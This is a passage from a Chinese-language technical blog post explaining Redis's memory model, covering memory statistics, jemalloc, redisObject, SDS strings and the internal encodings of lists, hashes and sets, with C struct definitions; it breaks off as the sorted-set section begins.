class="line">mem_allocator:jemalloc-3.6.0</span><br></pre></td></tr></table></figure><p>其中，info命令可以显示redis服务器的许多信息，包括服务器基本信息、CPU、内存、持久化、客户端连接信息等等；memory是参数，表示只显示内存相关的信息。</p><p>返回结果中比较重要的几个说明如下：</p><p><strong>（1）used_memory：</strong>即Redis分配器分配的内存总量（单位是字节），包括使用的虚拟内存（即swap）；Redis分配器后面会介绍。used_memory_human只是显示更友好。</p><p><strong>（2）used_memory_rss：</strong>即Redis进程占据操作系统的内存（单位是字节），与top及ps命令看到的值是一致的；除了分配器分配的内存之外，used_memory_rss还包括进程运行本身需要的内存、内存碎片等，但是不包括虚拟内存。</p><p>因此，used_memory和used_memory_rss，前者是从Redis角度得到的量，后者是从操作系统角度得到的量。二者之所以有所不同，一方面是因为内存碎片和Redis进程运行需要占用内存，使得前者可能比后者小，另一方面虚拟内存的存在，使得前者可能比后者大。</p><p>由于在实际应用中，Redis的数据量会比较大，此时进程运行占用的内存与Redis数据量和内存碎片相比，都会小得多；因此used_memory_rss和used_memory的比例便成了衡量Redis内存碎片率的参数；这个参数就是mem_fragmentation_ratio。</p><p><strong>（3）mem_fragmentation_ratio：</strong>即内存碎片比率，该值是used_memory_rss / used_memory的比值。</p><p>mem_fragmentation_ratio一般大于1，且该值越大，内存碎片比例越大。如果mem_fragmentation_ratio&lt;1，说明Redis使用了虚拟内存，由于虚拟内存的媒介是磁盘，比内存速度要慢很多，当这种情况出现时，应该及时排查，如果内存不足应该及时处理，如增加Redis节点、增加Redis服务器的内存、优化应用等。</p><p>一般来说，mem_fragmentation_ratio在1.03左右是比较健康的状态（对于jemalloc来说）；上面截图中的mem_fragmentation_ratio值很大，是因为还没有向Redis中存入数据，Redis进程本身运行的内存使得used_memory_rss 比used_memory大得多。</p><p><strong>（4）mem_allocator：即</strong>Redis使用的内存分配器，在编译时指定，可以是 libc 、jemalloc或者tcmalloc，默认是jemalloc。截图中使用的便是默认的jemalloc。</p><h3 id="Redis内存划分"><a href="#Redis内存划分" class="headerlink" title="Redis内存划分"></a>Redis内存划分</h3><p>Redis作为内存数据库，在内存中存储的内容主要是数据（键值对）。通过前面的叙述可以知道，除了数据以外，Redis的其它部分也会占用内存。</p><p>Redis的内存占用主要可以划分为以下几个部分：</p><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p>作为数据库，数据是最主要的部分，这部分占用的内存会统计在used_memory中。</p><p>Redis使用键值对存储数据，其中的值（对象）包括5种类型：字符串、哈希、列表、集合、有序集合。</p><p>这5种类型是Redis对外提供的。实际上，在Redis内部，每种类型可能有2种或更多的内部编码实现。此外，Redis在存储对象时，并不是直接将数据扔进内存，而是会对对象进行各种包装：如RedisObject、SDS等。本文后面将重点介绍Redis中数据存储的细节。</p><h4 id="进程本身运行需要的内存"><a href="#进程本身运行需要的内存" class="headerlink" title="进程本身运行需要的内存"></a>进程本身运行需要的内存</h4><p>Redis主进程本身运行肯定需要占用内存，如代码、常量池等等。这部分内存大约几兆，在大多数生产环境中与Redis数据占用的内存相比可以忽略。这部分内存不是由jemalloc分配，因此不会统计在used_memory中。</p><p><span style="font-family: 微软雅黑;font-size: 14px;color: rgb(136, 136, 136);">补充说明：除了主进程外，Redis创建的子进程运行也会占用内存，如Redis执行AOF、RDB重写时创建的子进程。当然，这部分内存不属于Redis进程，也不会统计在used_memory和used_memory_rss中。</span></p><h4 id="缓冲内存"><a href="#缓冲内存" class="headerlink" title="缓冲内存"></a>缓冲内存</h4><p>缓冲内存包括：</p><ul><li>客户端缓冲区：存储客户端连接的输入输出缓冲；</li><li>复制积压缓冲区：用于部分复制功能；</li><li>AOF缓冲区：用于在进行AOF重写时，保存最近的写入命令。</li></ul><p>在了解相应功能之前，不需要知道这些缓冲的细节。这部分内存由jemalloc分配，因此会统计在used_memory中。</p><h4 id="内存碎片"><a href="#内存碎片" class="headerlink" title="内存碎片"></a>内存碎片</h4><p>内存碎片是Redis在分配、回收物理内存过程中产生的。例如，如果对数据更改频繁，而且数据之间的大小相差很大，可能导致Redis释放的空间在物理内存中并没有释放，但Redis又无法有效利用，这就形成了内存碎片。内存碎片不会统计在used_memory中。</p><p>内存碎片的产生与对数据进行的操作、数据的特点等都有关。此外，与使用的内存分配器也有关系——如果内存分配器设计合理，可以尽可能的减少内存碎片的产生。后面将要说到的jemalloc便在控制内存碎片方面做的很好。</p><p>如果Redis服务器中的内存碎片已经很大，可以通过安全重启的方式减小内存碎片。因为重启之后，Redis重新从备份文件中读取数据，在内存中进行重排，为每个数据重新选择合适的内存单元，减小内存碎片。</p><h3 id="Redis数据存储的细节"><a href="#Redis数据存储的细节" class="headerlink" title="Redis数据存储的细节"></a>Redis数据存储的细节</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>关于Redis数据存储的细节，涉及到内存分配器（如jemalloc）、简单动态字符串（SDS）、5种对象类型及内部编码、RedisObject。在讲述具体内容之前，先说明一下这几个概念之间的关系。</p><p>下图是执行set hello world时，所涉及到的数据模型。</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic1.webp"><p><strong>（1）dictEntry：</strong>Redis是Key-Value数据库，因此对每个键值对都会有一个dictEntry，里面存储了指向Key和Value的指针；next指向下一个dictEntry，与本Key-Value无关。</p><p><strong>（2）Key：</strong>图中右上角可见，Key（“hello”）并不是直接以字符串存储，而是存储在SDS结构中。</p><p><strong>（3）redisObject：</strong>Value(“world”)既不是直接以字符串存储，也不是像Key一样直接存储在SDS中，而是存储在redisObject中。实际上，不论Value是5种类型的哪一种，都是通过RedisObject来存储的；而RedisObject中的type字段指明了Value对象的类型，ptr字段则指向对象所在的地址。不过可以看出，字符串对象虽然经过了RedisObject的包装，但仍然需要通过SDS存储。</p><p>实际上，RedisObject除了type和ptr字段以外，还有其它字段图中没有给出，如用于指定对象内部编码的字段。后面会详细介绍。</p><p><strong>（4）jemalloc：</strong>无论是DictEntry对象，还是RedisObject、SDS对象，都需要内存分配器（如jemalloc）分配内存进行存储。以DictEntry对象为例，有3个指针组成，在64位机器下占24个字节，jemalloc会为它分配32字节大小的内存单元。</p><p>下面来分别介绍jemalloc、RedisObject、SDS、对象类型及内部编码。</p><h4 id="jemalloc"><a href="#jemalloc" class="headerlink" title="jemalloc"></a>jemalloc</h4><p>Redis在编译时便会指定内存分配器；内存分配器可以是 libc 、jemalloc或者tcmalloc，默认是jemalloc。</p><p>jemalloc作为Redis的默认内存分配器，在减小内存碎片方面做的相对比较好。jemalloc在64位系统中，将内存空间划分为小、大、巨大三个范围；每个范围内又划分了许多小的内存块单位；当Redis存储数据时，会选择大小最合适的内存块进行存储。</p><p>jemalloc划分的内存单元如下图所示：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic2.webp"><p>例如，如果需要存储大小为130字节的对象，jemalloc会将其放入160字节的内存单元中。</p><h4 id="RedisObject"><a href="#RedisObject" class="headerlink" title="RedisObject"></a>RedisObject</h4><p>前面说到，Redis对象有5种类型；无论是哪种类型，Redis都不会直接存储，而是通过RedisObject对象进行存储。</p><p>RedisObject对象非常重要，Redis对象的类型、内部编码、内存回收、共享对象等功能，都需要RedisObject支持，下面将通过RedisObject的结构来说明它是如何起作用的。</p><p>RedisObject的定义如下（不同版本的Redis可能稍稍有所不同）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">redisObject</span> &#123;</span></span><br><span class="line">　　<span class="keyword">unsigned</span> type:<span class="number">4</span>;</span><br><span class="line">　　<span class="keyword">unsigned</span> encoding:<span class="number">4</span>;</span><br><span class="line">　　<span class="keyword">unsigned</span> lru:REDIS_LRU_BITS; <span class="comment">/* lru time (relative to server.lruclock) */</span></span><br><span class="line">　　<span class="keyword">int</span> refcount;</span><br><span class="line">　　<span class="keyword">void</span> *ptr;</span><br><span class="line">&#125; robj;</span><br></pre></td></tr></table></figure><p>RedisObject的每个字段的含义和作用如下：</p><h5 id="type"><a href="#type" class="headerlink" title="type"></a>type</h5><p>type字段表示对象的类型，占4个比特；目前包括REDIS_STRING(字符串)、REDIS_LIST (列表)、REDIS_HASH(哈希)、REDIS_SET(集合)、REDIS_ZSET(有序集合)。</p><p>当我们执行type命令时，便是通过读取RedisObject的type字段获得对象的类型。如下图所示：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic3.webp"><h5 id="encoding"><a href="#encoding" class="headerlink" title="encoding"></a>encoding</h5><p>encoding表示对象的内部编码，占4个比特。</p><p>对于Redis支持的每种类型，都有至少两种内部编码，例如对于字符串，有int、embstr、raw三种编码。通过encoding属性，Redis可以根据不同的使用场景来为对象设置不同的编码，大大提高了Redis的灵活性和效率。</p><p>以列表对象为例，有压缩列表和双端链表两种编码方式；如果列表中的元素较少，Redis倾向于使用压缩列表进行存储，因为压缩列表占用内存更少，而且比双端链表可以更快载入；当列表对象元素较多时，压缩列表就会转化为更适合存储大量元素的双端链表。</p><p>通过object encoding命令，可以查看对象采用的编码方式，如下图所示：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic4.webp"><p>5种对象类型对应的编码方式以及使用条件，将在后面介绍。</p><h5 id="lru"><a href="#lru" class="headerlink" title="lru"></a>lru</h5><p>lru记录的是对象最后一次被命令程序访问的时间，占据的比特数不同的版本有所不同（如4.0版本占24比特，2.6版本占22比特）。</p><p>通过对比lru时间与当前时间，可以计算某个对象的空转时间；object idletime命令可以显示该空转时间（单位是秒）。object idletime命令的一个特殊之处在于它不改变对象的lru值。</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic5.webp"><p>lru值除了通过object idletime命令打印之外，还与Redis的内存回收有关系：如果Redis打开了maxmemory选项，且内存回收算法选择的是volatile-lru或allkeys—lru，那么当Redis内存占用超过maxmemory指定的值时，Redis会优先选择空转时间最长的对象进行释放。</p><h5 id="refcount"><a href="#refcount" class="headerlink" title="refcount"></a>refcount</h5><h6 id="refcount与共享对象"><a href="#refcount与共享对象" class="headerlink" title="refcount与共享对象"></a>refcount与共享对象</h6><p>refcount记录的是该对象被引用的次数，类型为整型。refcount的作用，主要在于对象的引用计数和内存回收：</p><ul><li>当创建新对象时，refcount初始化为1；</li><li>当有新程序使用该对象时，refcount加1；</li><li>当对象不再被一个新程序使用时，refcount减1；</li><li>当refcount变为0时，对象占用的内存会被释放。</li></ul><p>Redis中被多次使用的对象(refcount&gt;1)称为共享对象。Redis为了节省内存，当有一些对象重复出现时，新的程序不会创建新的对象，而是仍然使用原来的对象。这个被重复使用的对象，就是共享对象。目前共享对象仅支持整数值的字符串对象。</p><h6 id="共享对象的具体实现"><a href="#共享对象的具体实现" class="headerlink" title="共享对象的具体实现"></a>共享对象的具体实现</h6><p>Redis的共享对象目前只支持整数值的字符串对象。之所以如此，实际上是对内存和CPU（时间）的平衡：共享对象虽然会降低内存消耗，但是判断两个对象是否相等却需要消耗额外的时间。</p><ul><li>对于整数值，判断操作复杂度为O(1)；</li><li>对于普通字符串，判断复杂度为O(n)；</li><li>而对于哈希、列表、集合和有序集合，判断的复杂度为O(n^2)。</li></ul><p>虽然共享对象只能是整数值的字符串对象，但是5种类型都可能使用共享对象（如哈希、列表等的元素可以使用）。</p><p>就目前的实现来说，Redis服务器在初始化时，会创建10000个字符串对象，值分别是0<del>9999的整数值；当Redis需要使用值为0</del>9999的字符串对象时，可以直接使用这些共享对象。10000这个数字可以通过调整参数REDIS_SHARED_INTEGERS（4.0中是OBJ_SHARED_INTEGERS）的值进行改变。</p><p>共享对象的引用次数可以通过object refcount命令查看，如下图所示。命令执行的结果页佐证了只有0~9999之间的整数会作为共享对象。</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic6.webp"><h5 id="ptr"><a href="#ptr" class="headerlink" title="ptr"></a>ptr</h5><p>ptr指针指向具体的数据，如前面的例子中，set hello world，ptr指向包含字符串world的SDS。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>综上所述，redisObject的结构与对象类型、编码、内存回收、共享对象都有关系；一个redisObject对象的大小为16字节：</p><p>4bit+4bit+24bit+4Byte+8Byte=16Byte。</p><h4 id="SDS"><a href="#SDS" class="headerlink" title="SDS"></a>SDS</h4><p>Redis没有直接使用C字符串(即以空字符‘\0’结尾的字符数组)作为默认的字符串表示，而是使用了SDS。SDS是简单动态字符串(Simple Dynamic String)的缩写。</p><h5 id="SDS结构"><a href="#SDS结构" class="headerlink" title="SDS结构"></a>SDS结构</h5><p>sds的结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">free</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中，buf表示字节数组，用来存储字符串；len表示buf已使用的长度，free表示buf未使用的长度。</p><p>下面是两个例子：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic7.webp"><p>通过SDS的结构可以看出，buf数组的长度=free+len+1（其中1表示字符串结尾的空字符）；所以，一个SDS结构占据的空间为：free所占长度+len所占长度+ buf数组的长度=4+4+free+len+1=free+len+9。</p><h5 id="SDS与C字符串的比较"><a href="#SDS与C字符串的比较" class="headerlink" title="SDS与C字符串的比较"></a>SDS与C字符串的比较</h5><p>SDS在C字符串的基础上加入了free和len字段，带来了很多好处：</p><ul><li>获取字符串长度：SDS是O(1)，C字符串是O(n)。</li><li>缓冲区溢出：使用C字符串的API时，如果字符串长度增加（如strcat操作）而忘记重新分配内存，很容易造成缓冲区的溢出；而SDS由于记录了长度，相应的API在可能造成缓冲区溢出时会自动重新分配内存，杜绝了缓冲区溢出。</li><li>修改字符串时内存的重分配：对于C字符串，如果要修改字符串，必须要重新分配内存（先释放再申请），因为如果没有重新分配，字符串长度增大时会造成内存缓冲区溢出，字符串长度减小时会造成内存泄露。而对于SDS，由于可以记录len和free，因此解除了字符串长度和空间数组长度之间的关联，可以在此基础上进行优化——空间预分配策略（即分配内存时比实际需要的多）使得字符串长度增大时重新分配内存的概率大大减小；惰性空间释放策略使得字符串长度减小时重新分配内存的概率大大减小。</li><li>存取二进制数据：SDS可以，C字符串不可以。因为C字符串以空字符作为字符串结束的标识，而对于一些二进制文件（如图片等），内容可能包括空字符串，因此C字符串无法正确存取；而SDS以字符串长度len来作为字符串结束标识，因此没有这个问题。</li></ul><p>此外，由于SDS中的buf仍然使用了C字符串（即以‘\0’结尾），因此SDS可以使用C字符串库中的部分函数。但是需要注意的是，只有当SDS用来存储文本数据时才可以这样使用，在存储二进制数据时则不行（‘\0’不一定是结尾）。</p><h5 id="SDS与C字符串的应用"><a href="#SDS与C字符串的应用" class="headerlink" title="SDS与C字符串的应用"></a>SDS与C字符串的应用</h5><p>Redis在存储对象时，一律使用SDS代替C字符串。例如set hello world命令，hello和world都是以SDS的形式存储的。而sadd myset member1 member2 member3命令，不论是键“myset”，还是集合中的元素member1、 member2和member3，都是以SDS的形式存储。除了存储对象，SDS还用于存储各种缓冲区。</p><p>只有在字符串不会改变的情况下，如打印日志时，才会使用C字符串。</p><h3 id="Redis的对象类型与内部编码"><a href="#Redis的对象类型与内部编码" class="headerlink" title="Redis的对象类型与内部编码"></a>Redis的对象类型与内部编码</h3><p>前面已经说过，Redis支持5种对象类型，而每种结构都有至少两种编码。这样做的好处在于：一方面接口与实现分离，当需要增加或改变内部编码时，用户使用不受影响，另一方面可以根据不同的应用场景切换内部编码，提高效率。</p><p>Redis各种对象类型支持的内部编码如下图所示（图中版本是Redis3.0，Redis后面版本中又增加了内部编码，略过不提。本章所介绍的内部编码都是基于3.0的）：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic8.webp"><p>关于Redis内部编码的转换，都符合以下规律：编码转换在Redis写入数据时完成，且转换过程不可逆，只能从小内存编码向大内存编码转换。</p><h4 id="字符串（String）"><a href="#字符串（String）" class="headerlink" title="字符串（String）"></a>字符串（String）</h4><h5 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h5><p>字符串是最基础的类型，因为所有的键都是字符串类型，且字符串之外的其他几种复杂类型的元素也是字符串。字符串长度不能超过512MB。</p><h5 id="内部编码"><a href="#内部编码" class="headerlink" title="内部编码"></a>内部编码</h5><p>字符串类型的内部编码有3种，它们的应用场景如下：</p><ul><li>int：8个字节的长整型。字符串值是整型时，这个值使用long整型表示。</li><li>embstr：&lt;=39字节的字符串。embstr与raw都使用RedisObject和SDS保存数据。<strong>区别在于：</strong>embstr的使用只分配一次内存空间（因此RedisObject和SDS是连续的），而raw需要分配两次内存空间（分别为RedisObject和SDS分配空间）。因此与raw相比，embstr的好处在于创建时少分配一次空间、删除时少释放一次空间、对象的所有数据连在一起，寻找方便。而embstr的坏处也很明显：如果字符串的长度增加需要重新分配内存时，整个RedisObject和SDS都需要重新分配空间，因此Redis中的embstr实现为只读。</li><li>raw：大于39个字节的字符串</li></ul><p>示例如下图所示：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic9.webp"><p>embstr和raw进行区分的长度是39是因为RedisObject的长度是16字节，SDS的长度是9+字符串长度.因此当字符串长度是39时，embstr的长度正好是16+9+39=64，jemalloc正好可以分配64字节的内存单元。</p><h5 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h5><p>当int数据不再是整数，或大小超过了long的范围时，自动转化为raw。</p><p>而对于embstr，由于其实现是只读的，因此在对embstr对象进行修改时，都会先转化为raw再进行修改，因此，只要是修改embstr对象，修改后的对象一定是raw的，无论是否达到了39个字节。</p><p>示例如下图所示：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic10.webp"><h4 id="列表（List）"><a href="#列表（List）" class="headerlink" title="列表（List）"></a>列表（List）</h4><h5 id="概况-1"><a href="#概况-1" class="headerlink" title="概况"></a>概况</h5><p>列表（list）用来存储多个有序的字符串，每个字符串称为元素；一个列表可以存储2^32-1个元素。Redis中的列表支持两端插入和弹出，并可以获得指定位置（或范围）的元素，可以充当数组、队列、栈等。</p><h5 id="内部编码-1"><a href="#内部编码-1" class="headerlink" title="内部编码"></a>内部编码</h5><p>列表的内部编码可以是压缩列表（ziplist）或双端链表（linkedlist）。</p><p><strong>双端链表：</strong>由一个list结构和多个listNode结构组成，典型结构如下图所示：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic11.webp"><p>通过图中可以看出，双端链表同时保存了表头指针和表尾指针，并且每个节点都有指向前和指向后的指针。链表中保存了列表的长度，dup、free和match为节点值设置类型特定函数，所以链表可以用于保存各种不同类型的值。而链表中每个节点指向的是type为字符串的RedisObject。</p><p><strong>压缩列表：</strong>压缩列表是Redis为了节约内存而开发的，是由一系列特殊编码的连续内存块（而不是像双端链表一样每个节点是指针）组成的顺序型数据结构；具体结构相对比较复杂，略。与双端链表相比，压缩列表可以节省内存空间，但是进行修改或增删操作时，复杂度较高，因此当节点数量较少时，可以使用压缩列表。但是节点数量多时，还是使用双端链表划算。</p><p>压缩列表不仅用于实现列表，也用于实现哈希、有序列表，使用非常广泛。</p><h5 id="编码转换-1"><a href="#编码转换-1" class="headerlink" title="编码转换"></a>编码转换</h5><p>只有同时满足下面两个条件时，才会使用压缩列表：</p><ul><li>列表中元素数量小于512个；</li><li>列表中所有字符串对象都不足64字节。</li></ul><p>如果有一个条件不满足，则使用双端列表，且编码只可能由压缩列表转化为双端链表，反方向则不可能。</p><p>下图展示了列表编码转换的特点：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic12.webp"><p>其中，单个字符串不能超过64字节，是为了便于统一分配每个节点的长度。这里的64字节是指字符串的长度，不包括SDS结构，因为压缩列表使用连续、定长内存块存储字符串，不需要SDS结构指明长度。后面提到压缩列表，也会强调长度不超过64字节，原理与这里类似。</p><h4 id="哈希（Hash）"><a href="#哈希（Hash）" class="headerlink" title="哈希（Hash）"></a>哈希（Hash）</h4><h5 id="概况-2"><a href="#概况-2" class="headerlink" title="概况"></a>概况</h5><p>哈希作为一种数据结构，不仅与字符串、列表、集合、有序结合并列，是Redis对外提供的5种对象类型的一种，也是Redis作为Key-Value数据库所使用的数据结构。为了说明的方便，在本文后面当使用“内层的哈希”时，代表的是Redis对外提供的5种对象类型的一种；使用“外层的哈希”代指Redis作为Key-Value数据库所使用的数据结构。</p><h5 id="内部编码-2"><a href="#内部编码-2" class="headerlink" title="内部编码"></a>内部编码</h5><p>内层的哈希使用的内部编码可以是压缩列表（ziplist）和哈希表（hashtable）两种；Redis的外层的哈希则只使用了hashtable。</p><p>压缩列表前面已介绍。与哈希表相比，压缩列表用于元素个数少、元素长度小的场景，其优势在于集中存储，节省空间。同时，虽然对于元素的操作复杂度也由O(n)变为了O(1)，但由于哈希中元素数量较少，因此操作的时间并没有明显劣势。</p><p>hashtable：一个hashtable由1个dict结构、2个dictht结构、1个dictEntry指针数组（称为bucket）和多个dictEntry结构组成。</p><p>正常情况下，即hashtable没有进行rehash时，各部分关系如下图所示：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic13.webp"><p>下面从底层向上依次介绍各个部分：</p><h6 id="dictEntry"><a href="#dictEntry" class="headerlink" title="dictEntry"></a>dictEntry</h6><p>dictEntry结构用于保存键值对，结构定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictEntry</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *key;</span><br><span class="line">    <span class="keyword">union</span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *val;</span><br><span class="line">        uint64_tu64;</span><br><span class="line">        int64_ts64;</span><br><span class="line">    &#125; v;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dictEntry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; dictEntry;</span><br></pre></td></tr></table></figure><p>其中，各个属性的功能如下：</p><ul><li>key：键值对中的键；</li><li>val：键值对中的值，使用union(即共用体)实现，存储的内容既可能是一个指向值的指针，也可能是64位整型，或无符号64位整型；</li><li>next：指向下一个dictEntry，用于解决哈希冲突问题</li><li>在64位系统中，一个dictEntry对象占24字节（key/val/next各占8字节）。</li></ul><h6 id="bucket"><a href="#bucket" class="headerlink" title="bucket"></a>bucket</h6><p>bucket是一个数组，数组的每个元素都是指向dictEntry结构的指针。Redis中bucket数组的大小计算规则如下：大于dictEntry的、最小的2^n。例如，如果有1000个dictEntry，那么bucket大小为1024；如果有1500个dictEntry，则bucket大小为2048。</p><h6 id="dictht"><a href="#dictht" class="headerlink" title="dictht"></a>dictht</h6><p>dictht结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictht</span>&#123;</span></span><br><span class="line">    dictEntry **table;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sizemask;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> used;</span><br><span class="line">&#125; dictht;</span><br></pre></td></tr></table></figure><p>其中，各个属性的功能说明如下：</p><ul><li>table属性是一个指针，指向bucket；</li><li>size属性记录了哈希表的大小，即bucket的大小；</li><li>used记录了已使用的dictEntry的数量；</li><li>sizemask属性的值总是为size-1，这个属性和哈希值一起决定一个键在table中存储的位置。</li></ul><h6 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h6><p>一般来说，通过使用dictht和dictEntry结构，便可以实现普通哈希表的功能；但是Redis的实现中，在dictht结构的上层，还有一个dict结构。下面说明dict结构的定义及作用。</p><p>dict结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dict</span>&#123;</span></span><br><span class="line">    dictType *type;</span><br><span class="line">    <span class="keyword">void</span> *privdata;</span><br><span class="line">    dictht ht[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> trehashidx;</span><br><span class="line">&#125; dict;</span><br></pre></td></tr></table></figure><p>其中，type属性和privdata属性是为了适应不同类型的键值对，用于创建多态字典。</p><p>ht属性和trehashidx属性则用于rehash，即当哈希表需要扩展或收缩时使用。</p><p>ht是一个包含两个项的数组，每项都指向一个dictht结构，这也是Redis的哈希会有1个dict、2个dictht结构的原因。通常情况下，所有的数据都是存在放dict的ht[0]中，ht[1]只在rehash的时候使用。dict进行rehash操作的时候，将ht[0]中的所有数据rehash到ht[1]中。然后将ht[1]赋值给ht[0]，并清空ht[1]。</p><p>因此，Redis中的哈希之所以在dictht和dictEntry结构之外还有一个dict结构，一方面是为了适应不同类型的键值对，另一方面是为了rehash。</p><h5 id="编码转换-2"><a href="#编码转换-2" class="headerlink" title="编码转换"></a>编码转换</h5><p>如前所述，Redis中内层的哈希既可能使用哈希表，也可能使用压缩列表。</p><p>只有同时满足下面两个条件时，才会使用压缩列表：</p><ul><li>哈希中元素数量小于512个；</li><li>哈希中所有键值对的键和值字符串长度都小于64字节。</li></ul><p>如果有一个条件不满足，则使用哈希表；且编码只可能由压缩列表转化为哈希表，反方向则不可能。</p><p>下图展示了Redis内层的哈希编码转换的特点：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic14.webp"><h4 id="集合（Set）"><a href="#集合（Set）" class="headerlink" title="集合（Set）"></a>集合（Set）</h4><h5 id="概况-3"><a href="#概况-3" class="headerlink" title="概况"></a>概况</h5><p>集合（set）与列表类似，都是用来保存多个字符串，但集合与列表有两点不同：集合中的元素是无序的，因此不能通过索引来操作元素；集合中的元素不能有重复。</p><p>一个集合中最多可以存储2^32-1个元素，除了支持常规的增删改查，Redis还支持多个集合取交集、并集、差集。</p><h5 id="内部编码-3"><a href="#内部编码-3" class="headerlink" title="内部编码"></a>内部编码</h5><p>集合的内部编码可以是整数集合（intset）或哈希表（hashtable）。</p><p>哈希表前面已经讲过，这里略过不提。需要注意的是集合在使用哈希表时，值全部被置为null。</p><p>整数集合的结构定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">intset</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> encoding;</span><br><span class="line">    <span class="keyword">uint32_t</span> length;</span><br><span class="line">    <span class="keyword">int8_t</span> contents[];</span><br><span class="line">&#125; intset;</span><br></pre></td></tr></table></figure><p>其中，encoding代表contents中存储内容的类型，虽然contents（存储集合中的元素）是int8_t类型，但实际上其存储的值是int16_t、int32_t或int64_t，具体的类型便是由encoding决定的。length表示元素个数。</p><p>整数集合适用于集合所有元素都是整数且集合元素数量较小的时候，与哈希表相比，整数集合的优势在于集中存储，节省空间；同时，虽然对于元素的操作复杂度也由O(n)变为了O(1)，但由于集合数量较少，因此操作的时间并没有明显劣势。</p><h5 id="编码转换-3"><a href="#编码转换-3" class="headerlink" title="编码转换"></a>编码转换</h5><p>只有同时满足下面两个条件时，集合才会使用整数集合：</p><ul><li>集合中元素数量小于512个；</li><li>集合中所有元素都是整数值。</li></ul><p>如果有一个条件不满足，则使用哈希表；且编码只可能由整数集合转化为哈希表，反方向则不可能。</p><p>下图展示了集合编码转换的特点：</p><img src="/2019/04/04/2019-04-04-深入学习Redis之内存模型/pic15.webp"><h4 id="有序集合（ZSet）"><a href="#有序集合（ZSet）" class="headerlink" title="有序集合（ZSet）"></a>有序集合（ZSet）</h4><h5 id="概况-4"><a href="#概况-4" class="headerlink" title="概况"></a>概况</h5><p>有序集合与集合一样，元素都不能重复。但与集合不同的是，有序集合中的元素是有顺序的。与列表使用索引下标作为排序依据不同，有序集合为每个元素设置一个分数（score）作为排序依据。</p><h5 id="内部编码-4"><a href="#内部编码-4" class="headerlink" 